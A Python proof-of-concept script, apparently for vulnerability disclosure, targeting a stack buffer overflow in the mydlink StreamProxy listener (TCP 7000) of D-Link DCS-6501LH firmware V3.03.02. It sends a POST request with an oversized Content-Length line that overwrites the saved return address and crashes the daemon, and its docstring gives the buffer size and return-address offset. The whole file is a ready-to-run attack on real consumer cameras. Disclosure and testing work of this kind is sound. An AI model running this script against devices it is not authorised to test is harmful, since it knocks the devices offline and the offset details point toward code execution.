#!/usr/bin/env python3
"""Proof of concept for the stack buffer overflow in GetContentlen, reached
through the mydlink StreamProxy HTTP listener (TCP 7000) of D-Link
DCS-6501LH firmware V3.03.02.

When a request carries a Content-Type header, GetContentlen copies the rest of
the Content-Length header line into a 32-byte stack buffer using the line
length as the count.  The saved return address is 52 bytes above the buffer,
so a Content-Length line padded with 200 characters overwrites it with 'A'
and the daemon crashes with pc = ra = 0x41414141.

A benign reference request (8 characters of padding, same headers) leaves the
service running; it can be sent first with the --control option.

Non-destructive: only POST requests are sent; nothing is stored on the device.

Usage:
    python3 poc.py <host> [port] [--control]
"""
import socket
import sys

PORT = 7000
FILL = "A"
SHORT = 8
LONG = 200


def request(pad):
    return ("POST /x HTTP/1.1\r\nContent-Type: text/plain\r\n"
            "Content-Length: %s\r\n\r\nX" % (FILL * pad)).encode()


def send(payload, read=200):
    sock = socket.create_connection((HOST, PORT), 5)
    try:
        sock.sendall(payload)
        sock.settimeout(4)
        try:
            return sock.recv(read)
        except socket.timeout:
            return b"(timeout)"
    except ConnectionResetError:
        return b"(connection reset)"
    finally:
        sock.close()


def main():
    global HOST, PORT
    args = [a for a in sys.argv[1:] if a != "--control"]
    control = "--control" in sys.argv
    HOST = args[0] if len(args) > 0 else "127.0.0.1"
    PORT = int(args[1]) if len(args) > 1 else 7000

    print("[*] target %s:%d (mydlink StreamProxy)" % (HOST, PORT))

    if control:
        resp = send(request(SHORT))
        print("[*] control (%d-byte padding): %r" % (SHORT, resp[:60]))
        print("    expected: connection closed, service stays up")

    resp = send(request(LONG))
    print("[*] overflow (%d-byte padding): %r" % (LONG, resp[:60]))
    print("    expected: connection closed; daemon crashes with")
    print("              pc = ra = 0x41414141")


if __name__ == "__main__":
    HOST = "127.0.0.1"
    main()
